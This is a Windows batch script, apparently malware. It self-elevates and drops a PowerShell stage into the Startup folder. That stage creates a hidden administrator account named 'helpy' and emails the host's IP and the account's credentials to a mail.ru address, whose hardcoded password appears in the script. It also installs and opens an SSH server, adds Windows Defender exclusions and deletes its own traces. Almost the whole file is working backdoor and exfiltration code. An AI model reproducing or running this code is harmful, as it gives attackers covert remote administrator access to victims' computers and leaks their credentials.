@echo off

REM Custom
SET email=blabla.97@internet.ru
SET emailp=zc4qT8QwbaKsxrJUjxym
SET user=helpy
SET p=helpy

SET stage_path="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
SET init_path=%cd%


REM Script for self-elevation
net file 1>NUL 2>NUL || start "" mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c pushd ""%~dp0"" && ""%~s0"" %*","","runas",0)(window.close) && exit


REM Go smoothly
> %stage_path%/sec_stage.ps1 echo $temp_dir = ^(-join ^((65..90^) + ^(^97..122^) ^| Get-Random -Count 5 ^| %% ^{[char]^$_^}^)^)
>> %stage_path%/sec_stage.ps1 echo $global:mail_attach = "$env:Username.cfg"
>> %stage_path%/sec_stage.ps1 echo $global:email = ^(^Get-Content ./7r6lYgoLlv.txt^).Trim^(^)
>> %stage_path%/sec_stage.ps1 echo $global:emailp = ^(^Get-Content ./OWEeX45e3U.txt^).Trim^(^)
>> %stage_path%/sec_stage.ps1 echo $global:emailp = ^(^ConvertTo-SecureString -String $emailp -AsPlainText -Force^)
>> %stage_path%/sec_stage.ps1 echo $global:addr = ^(^(^Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet^).IPAddress^)
>> %stage_path%/sec_stage.ps1 echo $global:user = ^(^Get-Content ./etgtYmwQUO.txt^).Trim^(^)
>> %stage_path%/sec_stage.ps1 echo $global:p_plain = ^(^Get-Content ./f4EWj29Hgq.txt^).Trim^(^)
>> %stage_path%/sec_stage.ps1 echo $global:p = ^(^ConvertTo-SecureString -String $p_plain -AsPlainText -Force^)
>> %stage_path%/sec_stage.ps1 echo Add-Content -Path .\$mail_attach -Value $addr
>> %stage_path%/sec_stage.ps1 echo Add-Content -Path .\$mail_attach -Value $user
>> %stage_path%/sec_stage.ps1 echo Add-Content -Path .\$mail_attach -Value $p_plain
>> %stage_path%/sec_stage.ps1 echo Add-Content -Path .\$mail_attach -Value $temp_dir
>> %stage_path%/sec_stage.ps1 echo New-LocalUser $user -Password $p -FullName $user -Description $user
>> %stage_path%/sec_stage.ps1 echo Add-LocalGroupMember -Group "Administrators" -Member $user
>> %stage_path%/sec_stage.ps1 echo reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v $user
>> %stage_path%/sec_stage.ps1 echo Send-MailMessage -From $email -To $email -Subject "test3" -Attachment .\$mail_attach -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential ^(^New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, $emailp^)
>> %stage_path%/sec_stage.ps1 echo Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
>> %stage_path%/sec_stage.ps1 echo Start-Service sshd
>> %stage_path%/sec_stage.ps1 echo Set-Service -Name sshd -StartupType 'Automatic'
>> %stage_path%/sec_stage.ps1 echo if ^(^!^(^Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue ^| Select-Object Name, Enabled^)^) {
>> %stage_path%/sec_stage.ps1 echo     New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server ^(^sshd^)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
>> %stage_path%/sec_stage.ps1 echo }
>> %stage_path%/sec_stage.ps1 echo mkdir $env:Temp/$temp_dir
>> %stage_path%/sec_stage.ps1 echo [bool] $global:undone = $true
>> %stage_path%/sec_stage.ps1 echo $watcher = New-Object System.IO.FileSystemWatcher
>> %stage_path%/sec_stage.ps1 echo $watcher.Path = "C:\Users"
>> %stage_path%/sec_stage.ps1 echo $watcher.Filter = "*.*"
>> %stage_path%/sec_stage.ps1 echo $watcher.IncludeSubdirectories = $false
>> %stage_path%/sec_stage.ps1 echo $watcher.EnableRaisingEvents = $true
>> %stage_path%/sec_stage.ps1 echo $action = { $path = $Event.SourceEventArgs.FullPath
>> %stage_path%/sec_stage.ps1 echo             $changeType = $Event.SourceEventArgs.ChangeType
>> %stage_path%/sec_stage.ps1 echo             attrib +h +s +r C:\Users\$user
>> %stage_path%/sec_stage.ps1 echo             echo "hi" ^> .\hi.txt
>> %stage_path%/sec_stage.ps1 echo }
>> %stage_path%/sec_stage.ps1 echo Register-ObjectEvent $watcher "Created" -Action $action
>> %stage_path%/sec_stage.ps1 echo while($undone) {
>> %stage_path%/sec_stage.ps1 echo   Start-Sleep -Seconds 100
>> %stage_path%/sec_stage.ps1 echo   $undone = $false
>> %stage_path%/sec_stage.ps1 echo }
>> %stage_path%/sec_stage.ps1 echo Remove-Item .\7r6lYgoLlv.txt
>> %stage_path%/sec_stage.ps1 echo Remove-Item .\etgtYmwQUO.txt
>> %stage_path%/sec_stage.ps1 echo Remove-Item .\f4EWj29Hgq.txt
>> %stage_path%/sec_stage.ps1 echo Remove-Item .\OWEeX45e3U.txt
>> %stage_path%/sec_stage.ps1 echo Remove-Item .\$mail_attach
>> %stage_path%/sec_stage.ps1 echo Remove-Item $PSCommandPath -Force


echo %email% > %stage_path%/7r6lYgoLlv.txt
echo %emailp% > %stage_path%/OWEeX45e3U.txt
echo %user% > %stage_path%/etgtYmwQUO.txt
echo %p% > %stage_path%/f4EWj29Hgq.txt


REM Add third stage and temp dir to exclusion paths, set execution policy for insurance
cd %stage_path%
powershell -windowstyle hidden -c "Add-MpPreference -ExclusionPath '.\sec_stage.ps1'"
powershell -windowstyle hidden -c "Add-MpPreference -ExclusionPath '$env:Temp'; Set-ExecutionPolicy -ExecutionPolicy Bypass -Force; .\sec_stage.ps1"



cd %init_path%
DEL %0
